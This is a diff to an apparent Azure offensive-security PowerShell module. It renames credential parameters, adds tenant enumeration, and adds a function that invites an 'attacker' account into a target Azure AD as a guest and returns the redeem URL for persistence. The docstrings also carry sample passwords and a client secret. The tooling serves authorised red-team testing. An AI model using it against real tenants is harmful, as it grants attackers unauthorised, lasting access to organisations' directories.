@@ -455,10 +455,13 @@ Function Connect-ART {
         Example 1: Authentication as a user to the Azure via Access Token:
         PS> Connect-ART -AccessToken 'eyJ0eXA...'
         
-        Example 2: Authentication as a user to the Azure via Credentials:
+        Example 2: Authentication as a user to the Azure via Credential:
         PS> Connect-ART -Username test@test.onmicrosoft.com -Password Foobar123%
 
-        Example 3: Authentication as a Service Principal using added Application Secret:
+        Example 3: Authentication as a user to the Azure via Credential object:
+        PS> Connect-ART -Credential $creds
+
+        Example 4: Authentication as a Service Principal using added Application Secret:
         PS> Connect-ART -ServicePrincipal -Username f072c4a6-e696-11eb-b57b-00155d01ef0d -Password 'agq7Q~UZX5SYwxq2O7FNW~C_S1QNJcJrlLu.E' -TenantId b423726f-108d-4049-8c11-d52d5d388768
     #>
 
@@ -502,7 +505,7 @@ Function Connect-ART {
 
         [Parameter(Mandatory=$True, ParameterSetName = 'Credentials2')]
         [System.Management.Automation.PSCredential]
-        $Credentials
+        $Credential
     )
 
     try {
@@ -921,6 +924,7 @@ Function Connect-ARTAD {
 
     .EXAMPLE
         PS> Connect-ARTAD -AccessToken 'eyJ0eXA...'
+        PS> Connect-ARTAD -Credential $creds
         PS> Connect-ARTAD -Username test@test.onmicrosoft.com -Password Foobar123%
     #>
 
@@ -944,7 +948,7 @@ Function Connect-ARTAD {
 
         [Parameter(Mandatory=$True, ParameterSetName = 'Credentials2')]
         [System.Management.Automation.PSCredential]
-        $Credentials
+        $Credential
     )
 
     try {
@@ -2604,8 +2608,15 @@ Function Get-ARTAccess {
 
             $res = Get-AzResource
 
-            Write-Verbose "Step 1. Checking Dangerous Permissions that User has on Azure Resources..."
+            Write-Host "`n=== Available Tenants:`n" -ForegroundColor Yellow
+            $tenants = Get-ARTTenants
 
+            if ($tenants -ne $null -and $tenants.Length -gt 0) {
+                Write-Host "[+] Azure Tenants are available for the current user:" -ForegroundColor Green
+                $tenants
+            }
+
+            Write-Verbose "Step 1. Checking Dangerous Permissions that User has on Azure Resources..."
             Write-Host "`n=== Dangerous Permissions on Azure Resources:`n" -ForegroundColor Yellow
             $res = Get-ARTDangerousPermissions -SubscriptionId $SubscriptionId
 
@@ -3060,6 +3071,10 @@ Function Invoke-ARTGETRequest {
         }
 
         $out = Invoke-RestMethod @params
+
+        if (($out.PSobject.Properties.Length -eq 1) -and ([bool]($out.PSobject.Properties.name -match "value"))) {
+            $out = $out.value
+        }
 
         if($Json) {
             $out | ConvertTo-Json
@@ -3915,6 +3930,117 @@ Function Get-ARTADDynamicGroups {
     }
 }
 
+
+
+
+Function Add-ARTADGuestUser {
+    <#
+    .SYNOPSIS
+        Invites Guest user to Azure AD & returns Invite Redeem URL used to easily accept the invitation.
+
+    .DESCRIPTION
+        Sends Azure AD Guest user invitation e-mail, allowing to expand access to AAD tenant for the external attacker & returns Invite Redeem URL used to easily accept the invitation.
+
+    .PARAMETER UserEmail
+        Required. Guest user's e-mail address.
+
+    .PARAMETER UserDisplayName
+        Optional. Guest user's display name.
+
+    .PARAMETER RedirectUrl
+        Optional. Where to redirect user after accepting his invitation. Default: myapps.microsoft.com
+
+    .EXAMPLE
+        Example 1: Adds attacker account to the target Azure AD as a Guest:
+        PS C:\> Add-ARTADGuestUser -UserEmail attacker@contoso.onmicrosoft.com
+    #>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True)]
+        [string]
+        $UserEmail,
+
+        [Parameter(Mandatory=$False)]
+        [string]
+        $UserDisplayName,
+
+        [Parameter(Mandatory=$False)]
+        [string]
+        $RedirectUrl = "https://myapps.microsoft.com"
+    )
+
+    try {
+        $EA = $ErrorActionPreference
+        $ErrorActionPreference = 'silentlycontinue'
+
+        if($UserDisplayName -eq $null -or $UserDisplayName.Length -eq 0) {
+            $UserDisplayName = $UserEmail.Split('@')[0]
+        }
+
+        $out = New-AzureADMSInvitation -InvitedUserDisplayName $UserDisplayName -InvitedUserEmailAddress $UserEmail -InviteRedirectURL $RedirectUrl -SendInvitationMessage $false
+
+        $out | Select Id,InvitedUserDisplayName,InvitedUserEmailAddress,InviteRedeemUrl,InviteRedirectUrl,InvitedUserType,Status | fl
+
+        Write-Host "[+] Invitation Redeem URL:`n" -ForegroundColor Green
+        Write-Host "$($out.InviteRedeemUrl)`n"
+    }
+    catch {
+        Write-Host "[!] Function failed!" -ForegroundColor Red
+        Throw
+        Return
+    }
+    finally {
+        $ErrorActionPreference = $EA
+    }
+}
+
+
+Function Get-ARTTenants {
+    <#
+    .SYNOPSIS
+        List Tenants available for the currently authenticated user
+
+    .DESCRIPTION
+        List Tenants available for the currently authenticated user (or the one based on supplied Access Token)
+
+    .PARAMETER AccessToken
+        Azure Management access token
+
+    .EXAMPLE
+        PS C:\> Get-ARTTenants
+    #>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$False)]
+        [string]
+        $AccessToken
+    )
+
+    try {
+        $EA = $ErrorActionPreference
+        $ErrorActionPreference = 'silentlycontinue'
+
+        $resource = "https://management.azure.com"
+
+        if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
+            Write-Verbose "Access Token not provided. Requesting one from Get-AzAccessToken ..."
+            $AccessToken = Get-ARTAccessTokenAz -Resource $resource
+        }
+
+        $tenants = Invoke-ARTGETRequest -Uri "https://management.azure.com/tenants?api-version=2019-06-01" -AccessToken $AccessToken
+        $tenants | select tenantId,displayName,tenantCategory,@{Name="domains";Expression={$tenants | select -ExpandProperty domains}}
+    }
+    catch {
+        Write-Host "[!] Function failed!" -ForegroundColor Red
+        Throw
+        Return
+    }
+    finally {
+        $ErrorActionPreference = $EA
+    }
+}
 
 Function Get-ARTTenantID {
     <#
